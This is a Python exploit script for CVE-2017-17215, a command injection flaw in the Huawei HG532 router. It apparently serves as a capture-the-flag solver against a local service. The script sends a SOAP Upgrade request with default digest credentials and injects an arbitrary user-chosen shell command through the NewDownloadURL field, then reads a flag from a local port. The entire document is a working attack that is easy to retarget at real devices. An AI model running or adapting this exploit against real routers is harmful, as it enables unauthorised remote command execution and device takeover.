import socket
import time

import requests
from requests.auth import HTTPDigestAuth

TARGET_URL = "http://127.0.0.1:37215/ctrlt/DeviceUpgrade_1"
FLAG_HOST = "127.0.0.1"
FLAG_PORT = 31337
headers = {'Content-Type': 'text/xml; charset="utf-8"'}
ready_timeout = 40
ready_interval = 2
flag_timeout = 5
default_cmd = "echo HG532_CACHE_OK >/tmp/ctf.cache;/bin/check_cache.sh >/tmp/flag_out"

print("-----CVE-2017-17215 HUAWEI HG532 RCE-----\n")
cmd = input(f"command [{default_cmd}] > ").strip() or default_cmd

data = f'''<?xml version="1.0" ?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<s:Body>
<u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1">
<NewStatusURL>CH13hh</NewStatusURL>
<NewDownloadURL>;{cmd};</NewDownloadURL>
</u:Upgrade>
</s:Body>
</s:Envelope>'''

session = requests.Session()
session.trust_env = False


def wait_ready():
    deadline = time.time() + ready_timeout
    last_error = None

    while time.time() < deadline:
        try:
            r = session.get(TARGET_URL, timeout=2)
            print(f"[*] 37215 ready: {r.status_code}")
            return True
        except requests.exceptions.RequestException as e:
            last_error = e
            time.sleep(ready_interval)

    print("[*] 37215 still not ready:", last_error)
    return False


def recv_flag():
    deadline = time.time() + flag_timeout
    last_error = None

    while time.time() < deadline:
        try:
            with socket.create_connection((FLAG_HOST, FLAG_PORT), timeout=2) as sock:
                sock.settimeout(2)
                data = sock.recv(4096)
                if not data:
                    time.sleep(1)
                    continue
                print("\nflag:\n" + data.decode(errors="replace").strip())
                return True
        except OSError as e:
            last_error = e
            time.sleep(1)

    print("\n[*] flag port not ready:", last_error)
    return False


if not wait_ready():
    raise SystemExit(1)

try:
    r = session.post(TARGET_URL, timeout=10, auth=HTTPDigestAuth('dslf-config', 'admin'), headers=headers, data=data)
    print("\nstatus_code: " + str(r.status_code))
    print("\n" + r.text)
    if r.status_code == 200 and "/bin/check_cache.sh" in cmd:
        recv_flag()
except requests.exceptions.RequestException as e:
    print("\nrequest error:", e)
    print("[*] 37215 服务可能不稳定，但会先看目标侧副作用")
